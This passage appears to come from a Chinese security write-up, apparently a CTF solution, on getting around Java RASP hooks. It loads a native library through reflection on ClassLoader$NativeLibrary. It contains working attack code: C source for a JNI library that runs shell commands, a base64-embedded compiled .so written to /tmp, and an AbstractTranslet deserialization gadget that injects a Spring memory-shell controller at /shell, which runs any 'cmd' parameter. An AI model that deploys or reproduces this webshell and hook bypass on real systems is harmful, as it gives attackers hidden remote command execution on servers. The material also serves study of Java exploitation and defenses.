+<p>HookRce.transformed hook了forkAndExec（无法执行命令），HookJNI hook了loadLibrary0（无法使用System.load）。但是<code>java.lang.ClassLoader.NativeLibrary#load</code> 并未被 hook，并且反射也是可以正常使用的，所以可以使用反射来调用 <code>java.lang.ClassLoader.NativeLibrary</code> 中的 load 方法来加载恶意so文件执行命令。</p>
+<p>制作JNI。准备EvilClass.java</p>
+<pre><code class="language-java">public class EvilClass  {
+    public static native String execCmd(String cmd);
+}
+</code></pre>
+<p>在当前目录运行，生成 EvilClass.h</p>
+<pre><code class="language-shell">javac EvilClass.java
+javah EvilClass
+</code></pre>
+<p>根据EvilClass.h文件编写EvilClass.c文件</p>
+<pre><code class="language-c">#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;EvilClass.h&quot;
+
+int execmd(const char *cmd, char *result)
+{
+    char buffer[1024*12];              //定义缓冲区
+    FILE *pipe = popen(cmd, &quot;r&quot;); //打开管道，并执行命令
+    if (!pipe)
+        return 0; //返回0表示运行失败
+
+    while (!feof(pipe))
+    {
+        if (fgets(buffer, 128, pipe))
+        { //将管道输出到result中
+            strcat(result, buffer);
+        }
+    }
+    pclose(pipe); //关闭管道
+    return 1;      //返回1表示运行成功
+}
+JNIEXPORT jstring JNICALL Java_EvilClass_execCmd(JNIEnv *env, jclass class_object, jstring jstr)
+{
+
+    const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL);
+    char result[1024 * 12] = &quot;&quot;; //定义存放结果的字符串数组
+    if (1 == execmd(cstr, result))
+    {
+        // printf(result);
+    }
+
+    char return_messge[100] = &quot;&quot;;
+    strcat(return_messge, result);
+    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);
+    //system();
+
+    return cmdresult;
+}
+</code></pre>
+<p>编译生成对应动态链接库文件</p>
+<pre><code class="language-shell">gcc -fPIC -I $JAVA_HOME/include  -I $JAVA_HOME/include/linux -shared -o libcmd.so EvilClass.c
+</code></pre>
+<p>将该so文件base64编码放到java代码中方便加载。这段代码首先会把libcmd.so写入，然后加载。之后调用native方法EvilClass.execCmd的时候，就是我们动态加载库实现的。</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import org.springframework.web.servlet.support.RequestContextUtils;
+import org.springframework.web.util.pattern.PathPattern;
+import org.springframework.web.util.pattern.PathPatternParser;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.*;
+
+public class EvilClass extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
+    public static native String execCmd(String cmd);
+
+    static {
+        try {
+            String Evil_B64 = &quot;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AwALAJAHAAAAAAAAAAAAAAAAAAAAAAAAAwAMAEQKAAAAAAAAAAAAAAAAAAAAAAAAAwANAFgKAAAAAAAAAAAAAAAAAAAAAAAAAwAOAFwKAAAAAAAAAAAAAAAAAAAAAAAAAwAPAJgKAAAAAAAAAAAAAAAAAAAAAAAAAwAQANgNAQAAAAAAAAAAAAAAAAAAAAAAAwARAOANAQAAAAAAAAAAAAAAAAAAAAAAAwASAOgNAQAAAAAAAAAAAAAAAAAAAAAAAwATALgPAQAAAAAAAAAAAAAAAAAAAAAAAwAUAOgPAQAAAAAAAAAAAAAAAAAAAAAAAwAVAFAQAQAAAAAAAAAAAAAAAAAAAAAAAwAWAFgQAQAAAAAAAAAAAAAAAAAAAAAAAwAXAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAAALAJAHAAAAAAAAAAAAAAAAAAALAAAAAgALAJAHAAAAAAAAFAAAAAAAAAAIAAAAAAAJALAGAAAAAAAAAAAAAAAAAAAIAAAAAAAMAEQKAAAAAAAAAAAAAAAAAAAYAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAAAJAMAGAAAAAAAAAAAAAAAAAAAIAAAAAAAMAFAKAAAAAAAAAAAAAAAAAAAfAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAAALALAHAAAAAAAAAAAAAAAAAAAqAAAAAgALALAHAAAAAAAAAAAAAAAAAAAsAAAAAgALAOAHAAAAAAAAAAAAAAAAAAA/AAAAAAAVAFAQAQAAAAAAAAAAAAAAAABCAAAAAgALACAIAAAAAAAAAAAAAAAAAABYAAAAAQAWAFgQAQAAAAAAAQAAAAAAAAA/AAAAAAARAOANAQAAAAAAAAAAAAAAAABkAAAAAQARAOANAQAAAAAAAAAAAAAAAACLAAAAAgALAHAIAAAAAAAAAAAAAAAAAAA/AAAAAAAQANgNAQAAAAAAAAAAAAAAAACXAAAAAQAQANgNAQAAAAAAAAAAAAAAAAA/AAAAAAAPAKwKAAAAAAAAAAAAAAAAAAA/AAAAAAAWAFgQAQAAAAAAAAAAAAAAAAC2AAAABADx/wAAAAAAAAAAAAAAAAAAAAA/AAAAAAANAFgKAAAAAAAAAAAAAAAAAAAIAAAAAAALAHQIAAAAAAAAAAAAAAAAAAA/AAAAAAAPABALAAAAAAAAAAAAAAAAAAAfAAAABADx/wAAAAAAAAAAAAAAAAAAAAA/AAAAAAAPAFgLAAAAAAAAAAAAAAAAAADCAAAAAQAPAFgLAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADQAAAAAgAMAEQKAAAAAAAAAAAAAAAAAADWAAAAAQAVAFAQAQAAAAAAAAAAAAAAAADjAAAAAQDx/+gNAQAAAAAAAAAAAAAAAADsAAAAAAAOAFwKAAAAAAAAAAAAAAAAAAD/AAAAAQAVAFgQAQAAAAAAAAAAAAAAAAALAQAAAQDx/7gPAQAAAAAAAAAAAAAAAAAhAQAAAgAJALAGAAAAAAAAAAAAAAAAAAAIAAAAAAAKANAGAAAAAAAAAAAAAAAAAAAnAQAAIAAAAAAAAAAAAAAAAAAAAAAAAABDAQAAIgAAAAAAAAAAAAAAAAAAAAAAAABdAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABuAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACAAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACSAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACuAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAC9AQAAEQAAAAAAAAAAAAAAAAAAAAAAAADaAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADqAQAAEgALAHQIAAAAAAAA0AAAAAAAAADxAQAAEgALAEQJAAAAAAAAAAEAAAAAAAAIAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAaAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAA0AgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0aS5vACR4AGNhbGxfd2Vha19mbgBjcnRuLm8AY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwAkZABfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AEV2aWxDbGFzcy5jAF9fRlJBTUVfRU5EX18AX2ZpbmkAX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2luaXQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMTcAcG9wZW5AR0xJQkNfMi4xNwBzdHJjYXRAR0xJQkNfMi4xNwBtZW1zZXRAR0xJQkNfMi4xNwBfX3N0YWNrX2Noa19mYWlsQEdMSUJDXzIuMTcAX19nbW9uX3N0YXJ0X18AX19zdGFja19jaGtfZ3VhcmRAR0xJQkNfMi4xNwBmZW9mQEdMSUJDXzIuMTcAZXhlY21kAEphdmFfRXZpbENsYXNzX2V4ZWNDbWQAcGNsb3NlQEdMSUJDXzIuMTcAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBmZ2V0c0BHTElCQ18yLjE3AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAABwAAAAIAAAAAAAAAyAEAAAAAAADIAQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAALgAAAPb//28CAAAAAAAAAPABAAAAAAAA8AEAAAAAAAAoAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAAAAAAAAAAADgAAAALAAAAAgAAAAAAAAAYAgAAAAAAABgCAAAAAAAAmAEAAAAAAAAEAAAAAwAAAAgAAAAAAAAAGAAAAAAAAABAAAAAAwAAAAIAAAAAAAAAsAMAAAAAAACwAwAAAAAAAOcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAASAAAAP///28CAAAAAAAAAJgEAAAAAAAAmAQAAAAAAAAiAAAAAAAAAAMAAAAAAAAAAgAAAAAAAAACAAAAAAAAAFUAAAD+//9vAgAAAAAAAADABAAAAAAAAMAEAAAAAAAAQAAAAAAAAAAEAAAAAgAAAAgAAAAAAAAAAAAAAAAAAABkAAAABAAAAAIAAAAAAAAAAAUAAAAAAAAABQAAAAAAAMAAAAAAAAAAAwAAAAAAAAAIAAAAAAAAABgAAAAAAAAAbgAAAAQAAABCAAAAAAAAAMAFAAAAAAAAwAUAAAAAAADwAAAAAAAAAAMAAAAUAAAACAAAAAAAAAAYAAAAAAAAAHgAAAABAAAABgAAAAAAAACwBgAAAAAAALAGAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABzAAAAAQAAAAYAAAAAAAAA0AYAAAAAAADQBgAAAAAAAMAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAfgAAAAEAAAAGAAAAAAAAAJAHAAAAAAAAkAcAAAAAAAC0AgAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAIQAAAABAAAABgAAAAAAAABECgAAAAAAAEQKAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACKAAAAAQAAAAIAAAAAAAAAWAoAAAAAAABYCgAAAAAAAAIAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAkgAAAAEAAAACAAAAAAAAAFwKAAAAAAAAXAoAAAAAAAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKAAAAABAAAAAgAAAAAAAACYCgAAAAAAAJgKAAAAAAAAxAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACqAAAADgAAAAMAAAAAAAAA2A0BAAAAAADYDQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAtgAAAA8AAAADAAAAAAAAAOANAQAAAAAA4A0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMIAAAAGAAAAAwAAAAAAAADoDQEAAAAAAOgNAAAAAAAA0AEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADLAAAAAQAAAAMAAAAAAAAAuA8BAAAAAAC4DwAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA0AAAAAEAAAADAAAAAAAAAOgPAQAAAAAA6A8AAAAAAABoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAABQEAEAAAAAAFAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADfAAAACAAAAAMAAAAAAAAAWBABAAAAAABYEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA5AAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAWBAAAAAAAAArAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAIgQAAAAAAAAIAcAAAAAAAAZAAAAPgAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACoFwAAAAAAAEUCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA7RkAAAAAAADtAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==&quot;;
+            String LIB_PATH = &quot;/tmp/libcmd.so&quot;;
+
+            byte[] jniBytes = Base64.getDecoder().decode(Evil_B64);
+            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;);
+            randomAccessFile.write(jniBytes);
+            randomAccessFile.close();
+
+            ClassLoader cmdLoader = EvilClass.class.getClassLoader();
+            Class&lt;?&gt; classLoaderClazz = Class.forName(&quot;java.lang.ClassLoader&quot;);
+            Class&lt;?&gt; nativeLibraryClazz = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;);
+            Method load = nativeLibraryClazz.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class);
+            load.setAccessible(true);
+            Field field = classLoaderClazz.getDeclaredField(&quot;nativeLibraries&quot;);
+            field.setAccessible(true);
+            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);
+            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
+            nativeLibraryCons.setAccessible(true);
+            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false);
+            libs.addElement(nativeLibraryObj);
+            field.set(cmdLoader, libs);
+            load.invoke(nativeLibraryObj, LIB_PATH, false);
+
+            final String controllerPath = &quot;/shell&quot;;
+
+            // 获取当前应用上下文
+            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(
+                    ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()
+            );
+
+            // 通过 context 获取 RequestMappingHandlerMapping 对象
+            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
+
+            // 获取父类的 MappingRegistry 属性
+            Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;mappingRegistry&quot;);
+            f.setAccessible(true);
+            Object mappingRegistry = f.get(mapping);
+
+            // 反射调用 MappingRegistry 的 register 方法
+            Class&lt;?&gt; c = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;);
+            Method[] ms = c.getDeclaredMethods();
+
+
+            PathPatternsRequestCondition   prc       = new PathPatternsRequestCondition();
+            RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
+
+            Class&lt;?&gt; clazz1 = prc.getClass();
+            Field patternsField = clazz1.getDeclaredField(&quot;patterns&quot;);
+            patternsField.setAccessible(true); // 设置私有字段为可访问
+
+            // 创建新的 SortedSet&lt;PathPattern&gt; 并解析 controllerPath
+            PathPatternParser parser = new PathPatternParser();
+            PathPattern pathPattern = parser.parse(controllerPath);
+            SortedSet&lt;PathPattern&gt; epp = new TreeSet&lt;&gt;(Collections.singleton(pathPattern));
+
+            // 通过反射设置新的值
+            patternsField.set(prc, epp);
+
+            // 设置info的pathPatternsCondition为prc，patternsCondition为null
+            RequestMappingInfo info = new RequestMappingInfo(null, null, condition, null, null, null, null, null);
+            Class&lt;?&gt; clazz2 = info.getClass();
+            Field pathPatternsConditionField = clazz2.getDeclaredField(&quot;pathPatternsCondition&quot;);
+            Field patternsConditionField = clazz2.getDeclaredField(&quot;patternsCondition&quot;);
+            pathPatternsConditionField.setAccessible(true);
+            patternsConditionField.setAccessible(true);
+
+            pathPatternsConditionField.set(info, prc);
+            patternsConditionField.set(info, null);
+
+            Object evilController = new EvilClass();
+
+            for (Method method : ms) {
+                if (&quot;register&quot;.equals(method.getName())) {
+                    // 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index
+                    method.setAccessible(true);
+                    Method m = evilController.getClass().getDeclaredMethod(&quot;evilFunc&quot;, HttpServletRequest.class, HttpServletResponse.class);
+                    method.invoke(mappingRegistry, info, evilController, m);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void evilFunc(HttpServletRequest req, HttpServletResponse res) throws Exception{
+        String cmd = req.getParameter(&quot;cmd&quot;);
+        if (cmd != null) {
+            String output = EvilClass.execCmd(cmd);
+            PrintWriter out = res.getWriter();
+            out.println(output);
+            out.flush();
+            out.close();
+        }
+    }
+    
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
